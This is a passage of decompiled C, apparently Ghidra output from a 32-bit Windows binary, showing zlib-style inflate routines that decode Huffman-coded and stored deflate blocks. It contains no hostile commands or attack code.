  if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
    uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),_Src,uVar4);
    *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
    *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
  }
  if (uVar4 != 0) {
    _memcpy(local_4,_Src,uVar4);
    local_4 = (void *)((int)local_4 + uVar4);
    _Src = (void *)((int)_Src + uVar4);
  }
  if (_Src == *(void **)(unaff_ESI + 0x2c)) {
    _Src = *(void **)(unaff_ESI + 0x28);
    if (*(void **)(unaff_ESI + 0x34) == *(void **)(unaff_ESI + 0x2c)) {
      *(void **)(unaff_ESI + 0x34) = _Src;
    }
    uVar1 = *(uint *)(unaff_EBX + 0x10);
    uVar4 = *(int *)(unaff_ESI + 0x34) - (int)_Src;
    if (uVar1 < uVar4) {
      uVar4 = uVar1;
    }
    if ((uVar4 != 0) && (param_1 == -5)) {
      param_1 = 0;
    }
    *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar4;
    *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar4;
    if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
      uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),_Src,uVar4);
      *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
      *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
    }
    if (uVar4 != 0) {
      _memcpy(local_4,_Src,uVar4);
      local_4 = (void *)((int)local_4 + uVar4);
      _Src = (void *)((int)_Src + uVar4);
    }
  }
  *(void **)(unaff_EBX + 0xc) = local_4;
  *(void **)(unaff_ESI + 0x30) = _Src;
  return param_1;
}



void __cdecl FUN_00406350(undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4)

{
  int in_EAX;
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x1a);
  if (puVar1 != (undefined4 *)0x0) {
    *(undefined *)(puVar1 + 4) = param_1;
    *(undefined *)((int)puVar1 + 0x11) = param_2;
    *puVar1 = 0;
    *(undefined4 *)((int)puVar1 + 0x12) = param_3;
    *(undefined4 *)((int)puVar1 + 0x16) = param_4;
  }
  return;
}



void __thiscall FUN_00406390(void *this,int param_1)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  undefined *puVar4;
  byte **in_EAX;
  uint uVar5;
  undefined *puVar6;
  undefined *puVar7;
  byte *pbVar8;
  uint uVar9;
  uint local_1c;
  byte *local_14;
  undefined *local_10;
  byte *local_c;
  undefined *local_8;
  
  local_1c = *(uint *)((int)this + 0x20);
  piVar2 = *(int **)((int)this + 4);
  local_14 = in_EAX[1];
  pbVar8 = *in_EAX;
  puVar7 = *(undefined **)((int)this + 0x34);
  uVar9 = *(uint *)((int)this + 0x1c);
  if (puVar7 < *(undefined **)((int)this + 0x30)) {
    local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar7);
  }
  else {
    local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
  }
  iVar3 = *piVar2;
  do {
    puVar6 = puVar7;
    switch(iVar3) {
    case 0:
      if ((local_10 < (undefined *)0x102) || (local_14 < (byte *)0xa)) {
LAB_00406480:
        piVar2[3] = (uint)*(byte *)(piVar2 + 4);
        piVar2[2] = *(int *)((int)piVar2 + 0x12);
        *piVar2 = 1;
        goto switchD_004063d8_caseD_1;
      }
      *(uint *)((int)this + 0x20) = local_1c;
      *(uint *)((int)this + 0x1c) = uVar9;
      in_EAX[1] = local_14;
      in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
      *in_EAX = pbVar8;
      *(undefined **)((int)this + 0x34) = puVar7;
      param_1 = FUN_00407c60((uint)*(byte *)(piVar2 + 4),(uint)*(byte *)((int)piVar2 + 0x11),
                             *(int *)((int)piVar2 + 0x12),*(int *)((int)piVar2 + 0x16),(int)this,
                             in_EAX);
      local_14 = in_EAX[1];
      local_1c = *(uint *)((int)this + 0x20);
      pbVar8 = *in_EAX;
      uVar9 = *(uint *)((int)this + 0x1c);
      puVar7 = *(undefined **)((int)this + 0x34);
      if (puVar7 < *(undefined **)((int)this + 0x30)) {
        local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar7);
      }
      else {
        local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
      }
      if (param_1 == 0) goto LAB_00406480;
      *piVar2 = (uint)(param_1 != 1) * 2 + 7;
      goto LAB_004068c7;
    case 1:
switchD_004063d8_caseD_1:
      for (; uVar9 < (uint)piVar2[3]; uVar9 = uVar9 + 8) {
        if (local_14 == (byte *)0x0) {
LAB_00406905:
          *(uint *)((int)this + 0x20) = local_1c;
          *(uint *)((int)this + 0x1c) = uVar9;
          in_EAX[1] = (byte *)0x0;
          in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
          *in_EAX = pbVar8;
          *(undefined **)((int)this + 0x34) = puVar7;
          FUN_00406260(param_1);
          return;
        }
        bVar1 = *pbVar8;
        local_14 = local_14 + -1;
        pbVar8 = pbVar8 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
      }
      local_c = (byte *)(piVar2[2] + (*(uint *)(&DAT_0042ca48 + piVar2[3] * 4) & local_1c) * 8);
      local_1c = local_1c >> (local_c[1] & 0x1f);
      uVar9 = uVar9 - local_c[1];
      bVar1 = *local_c;
      uVar5 = (uint)bVar1;
      if (uVar5 == 0) {
        piVar2[2] = *(int *)(local_c + 4);
        *piVar2 = 6;
        goto LAB_004068c7;
      }
      if ((bVar1 & 0x10) != 0) {
        piVar2[2] = uVar5 & 0xf;
        piVar2[1] = *(int *)(local_c + 4);
        *piVar2 = 2;
        goto LAB_004068c7;
      }
      if ((bVar1 & 0x40) == 0) goto LAB_00406553;
      if ((bVar1 & 0x20) != 0) {
        *piVar2 = 7;
        goto LAB_004068c7;
      }
      *piVar2 = 9;
      in_EAX[6] = (byte *)0x42e228;
      param_1 = -3;
      goto LAB_004068d8;
    case 2:
      uVar5 = piVar2[2];
      for (; uVar9 < uVar5; uVar9 = uVar9 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_00406905;
        bVar1 = *pbVar8;
        local_14 = local_14 + -1;
        pbVar8 = pbVar8 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
      }
      piVar2[1] = piVar2[1] + (*(uint *)(&DAT_0042ca48 + uVar5 * 4) & local_1c);
      local_1c = local_1c >> ((byte)uVar5 & 0x1f);
      uVar9 = uVar9 - uVar5;
      piVar2[3] = (uint)*(byte *)((int)piVar2 + 0x11);
      piVar2[2] = *(int *)((int)piVar2 + 0x16);
      *piVar2 = 3;
      break;
    case 3:
      break;
    case 4:
      uVar5 = piVar2[2];
      for (; uVar9 < uVar5; uVar9 = uVar9 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_00406905;
        bVar1 = *pbVar8;
        local_14 = local_14 + -1;
        pbVar8 = pbVar8 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
      }
      piVar2[3] = piVar2[3] + (*(uint *)(&DAT_0042ca48 + uVar5 * 4) & local_1c);
      local_1c = local_1c >> ((byte)uVar5 & 0x1f);
      uVar9 = uVar9 - uVar5;
      *piVar2 = 5;
    case 5:
      local_8 = puVar7 + -piVar2[3];
      if (local_8 < *(undefined **)((int)this + 0x28)) {
        do {
          local_8 = local_8 + (*(int *)((int)this + 0x2c) - (int)*(undefined **)((int)this + 0x28));
        } while (local_8 < *(undefined **)((int)this + 0x28));
      }
      iVar3 = piVar2[1];
      while (iVar3 != 0) {
        puVar6 = puVar7;
        if (local_10 == (undefined *)0x0) {
          if (puVar7 == *(undefined **)((int)this + 0x2c)) {
            local_10 = *(undefined **)((int)this + 0x30);
            puVar6 = *(undefined **)((int)this + 0x28);
            if (local_10 != puVar6) {
              if (puVar6 < local_10) {
                local_10 = local_10 + (-1 - (int)puVar6);
              }
              else {
                local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
              }
              puVar7 = puVar6;
              if (local_10 != (undefined *)0x0) goto LAB_004067dd;
            }
          }
          *(undefined **)((int)this + 0x34) = puVar7;
          param_1 = FUN_00406260(param_1);
          puVar6 = *(undefined **)((int)this + 0x34);
          if (puVar6 < *(undefined **)((int)this + 0x30)) {
            local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
          }
          else {
            local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
          }
          if (puVar6 == *(undefined **)((int)this + 0x2c)) {
            puVar7 = *(undefined **)((int)this + 0x28);
            puVar4 = *(undefined **)((int)this + 0x30);
            if (puVar4 != puVar7) {
              puVar6 = puVar7;
              if (puVar7 < puVar4) {
                local_10 = puVar4 + (-1 - (int)puVar7);
              }
              else {
                local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
              }
            }
          }
          if (local_10 == (undefined *)0x0) goto LAB_00406948;
        }
LAB_004067dd:
        *puVar6 = *local_8;
        local_8 = local_8 + 1;
        local_10 = local_10 + -1;
        puVar7 = puVar6 + 1;
        param_1 = 0;
        if (local_8 == *(undefined **)((int)this + 0x2c)) {
          local_8 = *(undefined **)((int)this + 0x28);
        }
        piVar2[1] = piVar2[1] + -1;
        iVar3 = piVar2[1];
      }
LAB_004068c1:
      *piVar2 = 0;
      goto LAB_004068c7;
    case 6:
      if (local_10 == (undefined *)0x0) {
        if (puVar7 == *(undefined **)((int)this + 0x2c)) {
          local_10 = *(undefined **)((int)this + 0x30);
          puVar6 = *(undefined **)((int)this + 0x28);
          if (local_10 != puVar6) {
            if (puVar6 < local_10) {
              local_10 = local_10 + (-1 - (int)puVar6);
            }
            else {
              local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
            }
            puVar7 = puVar6;
            if (local_10 != (undefined *)0x0) goto LAB_004068a6;
          }
        }
        *(undefined **)((int)this + 0x34) = puVar7;
        param_1 = FUN_00406260(param_1);
        puVar6 = *(undefined **)((int)this + 0x34);
        if (puVar6 < *(undefined **)((int)this + 0x30)) {
          local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
        }
        else {
          local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
        }
        if (puVar6 == *(undefined **)((int)this + 0x2c)) {
          puVar7 = *(undefined **)((int)this + 0x28);
          puVar4 = *(undefined **)((int)this + 0x30);
          if (puVar4 != puVar7) {
            puVar6 = puVar7;
            if (puVar7 < puVar4) {
              local_10 = puVar4 + (-1 - (int)puVar7);
            }
            else {
              local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
            }
          }
        }
        if (local_10 == (undefined *)0x0) {
LAB_00406948:
          *(uint *)((int)this + 0x20) = local_1c;
          *(uint *)((int)this + 0x1c) = uVar9;
          in_EAX[1] = local_14;
          in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
          goto LAB_004068f0;
        }
      }
LAB_004068a6:
      *puVar6 = *(undefined *)(piVar2 + 2);
      puVar7 = puVar6 + 1;
      local_10 = local_10 + -1;
      param_1 = 0;
      goto LAB_004068c1;
    case 7:
      if (7 < uVar9) {
        local_14 = local_14 + 1;
        uVar9 = uVar9 - 8;
        pbVar8 = pbVar8 + -1;
      }
      *(undefined **)((int)this + 0x34) = puVar7;
      param_1 = FUN_00406260(param_1);
      puVar7 = *(undefined **)((int)this + 0x34);
      if (*(undefined **)((int)this + 0x30) == puVar7) {
        *piVar2 = 8;
switchD_004063d8_caseD_8:
        param_1 = 1;
LAB_004068d8:
        *(uint *)((int)this + 0x20) = local_1c;
        *(uint *)((int)this + 0x1c) = uVar9;
        in_EAX[1] = local_14;
      }
      else {
        *(uint *)((int)this + 0x20) = local_1c;
        *(uint *)((int)this + 0x1c) = uVar9;
        in_EAX[1] = local_14;
      }
      in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
      puVar6 = puVar7;
LAB_004068f0:
      *in_EAX = pbVar8;
      *(undefined **)((int)this + 0x34) = puVar6;
      FUN_00406260(param_1);
      return;
    case 8:
      goto switchD_004063d8_caseD_8;
    case 9:
      *(uint *)((int)this + 0x20) = local_1c;
      *(uint *)((int)this + 0x1c) = uVar9;
      in_EAX[1] = local_14;
      in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
      param_1 = -3;
      goto LAB_004068f0;
    default:
      param_1 = -2;
      goto LAB_004068d8;
    }
    for (; uVar9 < (uint)piVar2[3]; uVar9 = uVar9 + 8) {
      if (local_14 == (byte *)0x0) goto LAB_00406905;
      bVar1 = *pbVar8;
      local_14 = local_14 + -1;
      pbVar8 = pbVar8 + 1;
      param_1 = 0;
      local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
    }
    local_c = (byte *)(piVar2[2] + (*(uint *)(&DAT_0042ca48 + piVar2[3] * 4) & local_1c) * 8);
    local_1c = local_1c >> (local_c[1] & 0x1f);
    bVar1 = *local_c;
    uVar5 = (uint)bVar1;
    uVar9 = uVar9 - local_c[1];
    if ((bVar1 & 0x10) == 0) {
      if ((bVar1 & 0x40) != 0) {
        *piVar2 = 9;
        in_EAX[6] = (byte *)"invalid distance code";
        param_1 = -3;
        goto LAB_004068d8;
      }
LAB_00406553:
      piVar2[3] = uVar5;
      piVar2[2] = (int)(local_c + *(int *)(local_c + 4) * 8);
    }
    else {
      piVar2[2] = uVar5 & 0xf;
      piVar2[3] = *(int *)(local_c + 4);
      *piVar2 = 4;
    }
LAB_004068c7:
    iVar3 = *piVar2;
  } while( true );
}



void FUN_00406a00(void)

{
  int *in_EAX;
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if (in_EAX != (int *)0x0) {
    *in_EAX = unaff_ESI[0xf];
  }
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  return;
}



undefined4 * __cdecl FUN_00406a70(undefined4 param_1)

{
  int in_EAX;
  undefined4 *puVar1;
  int iVar2;
  int unaff_EBX;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x40);
  if (puVar1 != (undefined4 *)0x0) {
    iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),8,0x5a0);
    puVar1[9] = iVar2;
    if (iVar2 != 0) {
      iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1);
      puVar1[10] = iVar2;
      if (iVar2 == 0) {
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1[9]);
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
        return (undefined4 *)0x0;
      }
      puVar1[0xb] = iVar2 + unaff_EBX;
      puVar1[0xe] = param_1;
      *puVar1 = 0;
      FUN_00406a00();
      return puVar1;
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
  }
  return (undefined4 *)0x0;
}



// WARNING: Type propagation algorithm not settling

void __thiscall FUN_00406b10(void *this,int param_1)

{
  int *piVar1;
  byte bVar2;
  byte *pbVar3;
  byte *pbVar4;
  byte **in_EAX;
  uint uVar5;
  uint uVar6;
  undefined4 uVar7;
  undefined4 *puVar8;
  int iVar9;
  byte bVar10;
  uint uVar11;
  byte *_Src;
  uint uVar12;
  uint local_28;
  byte *local_24;
  byte *local_20;
  byte *local_1c;
  byte *local_18;
  int local_14;
  uint local_10;
  uint local_c;
  int local_8;
  int local_4;
  
  pbVar3 = *(byte **)((int)this + 0x34);
  local_20 = in_EAX[1];
  _Src = *in_EAX;
  uVar12 = *(uint *)((int)this + 0x1c);
  if (pbVar3 < *(byte **)((int)this + 0x30)) {
    local_18 = *(byte **)((int)this + 0x30) + (-1 - (int)pbVar3);
  }
  else {
    local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)pbVar3);
  }
                    // WARNING: Load size is inaccurate
  uVar11 = *this;
  uVar6 = *(uint *)((int)this + 0x20);
  uVar5 = *(uint *)((int)this + 0x20);
  do {
    local_28 = uVar5;
    local_24 = pbVar3;
    if (9 < uVar11) {
      param_1 = -2;
LAB_00406b5f:
      *(uint *)((int)this + 0x20) = local_28;
LAB_00406b66:
      *(uint *)((int)this + 0x1c) = uVar12;
      in_EAX[1] = local_20;
LAB_00406b70:
      pbVar3 = *in_EAX;
      *in_EAX = _Src;
      in_EAX[2] = in_EAX[2] + ((int)_Src - (int)pbVar3);
      *(byte **)((int)this + 0x34) = local_24;
      FUN_00406260(param_1);
      return;
    }
    switch((&switchD_00406b94::switchdataD_004074fc)[uVar11]) {
    case (undefined *)0x406b9b:
      iVar9 = param_1;
      for (; uVar5 = uVar6, uVar12 < 3; uVar12 = uVar12 + 8) {
        if (local_20 == (byte *)0x0) {
          *(uint *)((int)this + 0x20) = local_28;
          *(uint *)((int)this + 0x1c) = uVar12;
          in_EAX[1] = (byte *)0x0;
          goto LAB_0040724f;
        }
        bVar2 = *_Src;
        local_20 = local_20 + -1;
        _Src = _Src + 1;
        param_1 = 0;
        local_28 = uVar5 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
        uVar6 = local_28;
        iVar9 = param_1;
      }
      *(uint *)((int)this + 0x18) = uVar5 & 1;
      param_1 = iVar9;
      switch((uVar5 & 7) >> 1) {
      case 0:
        uVar11 = uVar12 - 3 & 7;
        uVar5 = (uVar5 >> 3) >> (sbyte)uVar11;
        uVar12 = (uVar12 - 3) - uVar11;
        *(undefined4 *)this = 1;
        local_28 = uVar5;
        break;
      case 1:
        iVar9 = FUN_00406350(9,5,&DAT_0042cab8,&DAT_0042dab8);
        *(int *)((int)this + 4) = iVar9;
        if (iVar9 == 0) {
          param_1 = -4;
          goto LAB_00406b5f;
        }
        uVar5 = local_28 >> 3;
        uVar12 = uVar12 - 3;
        *(undefined4 *)this = 6;
        local_28 = uVar5;
        break;
      case 2:
        uVar5 = uVar5 >> 3;
        uVar12 = uVar12 - 3;
        *(undefined4 *)this = 3;
        local_28 = uVar5;
        break;
      case 3:
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)"invalid block type";
        *(uint *)((int)this + 0x20) = local_28 >> 3;
        uVar12 = uVar12 - 3;
        param_1 = -3;
        goto LAB_00406b66;
      }
      break;
    case (undefined *)0x406c56:
      for (; uVar12 < 0x20; uVar12 = uVar12 + 8) {
        if (local_20 == (byte *)0x0) goto LAB_00407298;
        bVar2 = *_Src;
        local_20 = local_20 + -1;
        _Src = _Src + 1;
        param_1 = 0;
        uVar6 = uVar6 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
        local_28 = uVar6;
      }
      uVar11 = uVar6 & 0xffff;
      if (~uVar6 >> 0x10 != uVar11) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)"invalid stored block lengths";
        goto switchD_00406b94_caseD_4072c0;
      }
      uVar5 = 0;
      uVar12 = 0;
      *(uint *)((int)this + 4) = uVar11;
      local_28 = 0;
      if (uVar11 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      else {
        *(undefined4 *)this = 2;
      }
      break;
    case (undefined *)0x406cca:
      if (local_20 == (byte *)0x0) {
LAB_004072f3:
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = (byte *)0x0;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
        *in_EAX = _Src;
        *(byte **)((int)this + 0x34) = pbVar3;
        FUN_00406260(param_1);
        return;
      }
      if (local_18 == (byte *)0x0) {
        local_18 = (byte *)0x0;
        if (pbVar3 == *(byte **)((int)this + 0x2c)) {
          pbVar4 = *(byte **)((int)this + 0x30);
          local_24 = *(byte **)((int)this + 0x28);
          if (local_24 != pbVar4) {
            if (local_24 < pbVar4) {
              local_18 = pbVar4 + (-1 - (int)local_24);
            }
            else {
              local_18 = *(byte **)((int)this + 0x2c) + -(int)local_24;
            }
            pbVar3 = local_24;
            if (local_18 != (byte *)0x0) goto LAB_00406d77;
          }
        }
        local_24 = pbVar3;
        *(byte **)((int)this + 0x34) = local_24;
        iVar9 = FUN_00406260(param_1);
        pbVar3 = *(byte **)((int)this + 0x30);
        local_24 = *(byte **)((int)this + 0x34);
        if (local_24 < pbVar3) {
          local_18 = pbVar3 + (-1 - (int)local_24);
        }
        else {
          local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)local_24);
        }
        if (local_24 == *(byte **)((int)this + 0x2c)) {
          pbVar4 = *(byte **)((int)this + 0x28);
          if (pbVar4 != pbVar3) {
            local_24 = pbVar4;
            if (pbVar4 < pbVar3) {
              local_18 = pbVar3 + (-1 - (int)pbVar4);
            }
            else {
              local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)pbVar4);
            }
          }
        }
        if (local_18 == (byte *)0x0) {
          *(uint *)((int)this + 0x20) = uVar5;
          *(uint *)((int)this + 0x1c) = uVar12;
          in_EAX[1] = local_20;
          goto LAB_0040724f;
        }
      }
LAB_00406d77:
      param_1 = 0;
      local_1c = *(byte **)((int)this + 4);
      if (local_20 < *(byte **)((int)this + 4)) {
        local_1c = local_20;
      }
      if (local_18 < local_1c) {
        local_1c = local_18;
      }
      _memcpy(local_24,_Src,(size_t)local_1c);
      local_20 = local_20 + -(int)local_1c;
      local_24 = local_24 + (int)local_1c;
      local_18 = local_18 + -(int)local_1c;
      _Src = _Src + (int)local_1c;
      piVar1 = (int *)((int)this + 4);
      *piVar1 = *piVar1 - (int)local_1c;
      if (*piVar1 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      break;
    case (undefined *)0x406ddf:
      for (; uVar12 < 0xe; uVar12 = uVar12 + 8) {
        if (local_20 == (byte *)0x0) goto LAB_004072f3;
        bVar2 = *_Src;
        local_20 = local_20 + -1;
        _Src = _Src + 1;
        param_1 = 0;
        uVar6 = uVar6 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
        local_28 = uVar6;
      }
      *(uint *)((int)this + 4) = uVar6 & 0x3fff;
      if ((0x1d < (uVar6 & 0x1f)) || (uVar11 = (uVar6 & 0x3fff) >> 5 & 0x1f, 0x1d < uVar11)) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)"too many length or distance symbols";
        goto switchD_00406b94_caseD_4072c0;
      }
      iVar9 = (*(code *)in_EAX[8])(in_EAX[10],uVar11 + 0x102 + (uVar6 & 0x1f),4);
      *(int *)((int)this + 0xc) = iVar9;
      if (iVar9 == 0) {
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
        *in_EAX = _Src;
        *(byte **)((int)this + 0x34) = pbVar3;
        FUN_00406260(-4);
        return;
      }
      uVar6 = local_28 >> 0xe;
      uVar12 = uVar12 - 0xe;
      *(undefined4 *)((int)this + 8) = 0;
      *(undefined4 *)this = 4;
      local_28 = uVar6;
    case (undefined *)0x406e71:
      if (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4) {
        do {
          for (; uVar12 < 3; uVar12 = uVar12 + 8) {
            if (local_20 == (byte *)0x0) goto LAB_004072f3;
            bVar2 = *_Src;
            local_20 = local_20 + -1;
            _Src = _Src + 1;
            param_1 = 0;
            local_28 = uVar6 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
            uVar6 = local_28;
          }
          *(uint *)(*(int *)((int)this + 0xc) +
                   *(int *)(&DAT_0042dbb8 + *(int *)((int)this + 8) * 4) * 4) = uVar6 & 7;
          *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          local_28 = local_28 >> 3;
          uVar12 = uVar12 - 3;
          uVar6 = local_28;
        } while (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4);
      }
      uVar11 = *(uint *)((int)this + 8);
      while (uVar11 < 0x13) {
        *(undefined4 *)
         (*(int *)((int)this + 0xc) + *(int *)(&DAT_0042dbb8 + *(int *)((int)this + 8) * 4) * 4) = 0
        ;
        *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
        uVar11 = *(uint *)((int)this + 8);
      }
      *(int *)((int)this + 0x10) = 7;
      iVar9 = FUN_00407a40(*(void **)((int)this + 0xc),(int *)((int)this + 0x10),
                           (int *)((int)this + 0x14),*(int *)((int)this + 0x24));
      if (iVar9 != 0) {
        if (iVar9 == -3) {
          (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
          *(undefined4 *)this = 9;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
LAB_0040724f:
        pbVar3 = *in_EAX;
        *in_EAX = _Src;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)pbVar3);
        *(byte **)((int)this + 0x34) = local_24;
        FUN_00406260(iVar9);
        return;
      }
      *(undefined4 *)((int)this + 8) = 0;
      *(undefined4 *)this = 5;
      uVar6 = local_28;
switchD_00406b94_caseD_406f44:
      if (*(uint *)((int)this + 8) <
          (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f)) {
        do {
          uVar11 = *(uint *)((int)this + 0x10);
          if (uVar12 < uVar11) {
            do {
              if (local_20 == (byte *)0x0) goto LAB_004072f3;
              bVar2 = *_Src;
              local_20 = local_20 + -1;
              bVar10 = (byte)uVar12;
              uVar11 = *(uint *)((int)this + 0x10);
              uVar12 = uVar12 + 8;
              _Src = _Src + 1;
              uVar6 = uVar6 | (uint)bVar2 << (bVar10 & 0x1f);
              param_1 = 0;
              local_28 = uVar6;
            } while (uVar12 < uVar11);
          }
          iVar9 = *(int *)((int)this + 0x14) + (*(uint *)(&DAT_0042ca48 + uVar11 * 4) & uVar6) * 8;
          bVar2 = *(byte *)(iVar9 + 1);
          uVar11 = (uint)bVar2;
          local_c = *(uint *)(iVar9 + 4);
          if (local_c < 0x10) {
            local_28 = uVar6 >> (bVar2 & 0x1f);
            uVar12 = uVar12 - uVar11;
            *(uint *)(*(int *)((int)this + 0xc) + *(int *)((int)this + 8) * 4) = local_c;
            *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          }
          else {
            if (local_c == 0x12) {
              local_14 = 7;
            }
            else {
              local_14 = local_c - 0xe;
            }
            local_18 = (byte *)((uint)(local_c == 0x12) * 8 + 3);
            local_10 = uVar11 + local_14;
            for (; uVar12 < local_10; uVar12 = uVar12 + 8) {
              if (local_20 == (byte *)0x0) goto LAB_00407298;
              bVar10 = *_Src;
              local_20 = local_20 + -1;
              _Src = _Src + 1;
              param_1 = 0;
              uVar6 = uVar6 | (uint)bVar10 << ((byte)uVar12 & 0x1f);
              local_28 = uVar6;
            }
            uVar6 = uVar6 >> (bVar2 & 0x1f);
            local_18 = local_18 + (*(uint *)(&DAT_0042ca48 + local_14 * 4) & uVar6);
            local_28 = uVar6 >> ((byte)local_14 & 0x1f);
            uVar12 = uVar12 - (local_14 + uVar11);
            iVar9 = *(int *)((int)this + 8);
            if ((byte *)((*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 +
                        (*(uint *)((int)this + 4) & 0x1f)) < local_18 + iVar9) {
LAB_004073bb:
              (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
              *(undefined4 *)this = 9;
              in_EAX[6] = (byte *)"invalid bit length repeat";
              *(uint *)((int)this + 0x20) = local_28;
              *(uint *)((int)this + 0x1c) = uVar12;
              in_EAX[1] = local_20;
              in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
              *in_EAX = _Src;
              *(byte **)((int)this + 0x34) = pbVar3;
              FUN_00406260(-3);
              return;
            }
            if (local_c == 0x10) {
              if (iVar9 == 0) goto LAB_004073bb;
              uVar7 = *(undefined4 *)(*(int *)((int)this + 0xc) + -4 + iVar9 * 4);
            }
            else {
              uVar7 = 0;
            }
            do {
              *(undefined4 *)(*(int *)((int)this + 0xc) + iVar9 * 4) = uVar7;
              iVar9 = iVar9 + 1;
              local_18 = local_18 + -1;
            } while (local_18 != (byte *)0x0);
            *(int *)((int)this + 8) = iVar9;
            local_18 = (byte *)0x0;
          }
          uVar6 = local_28;
        } while (*(uint *)((int)this + 8) <
                 (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f))
        ;
      }
      *(undefined4 *)((int)this + 0x14) = 0;
      local_14 = 9;
      local_18 = (byte *)0x6;
      iVar9 = FUN_00407ae0((*(uint *)((int)this + 4) & 0x1f) + 0x101,
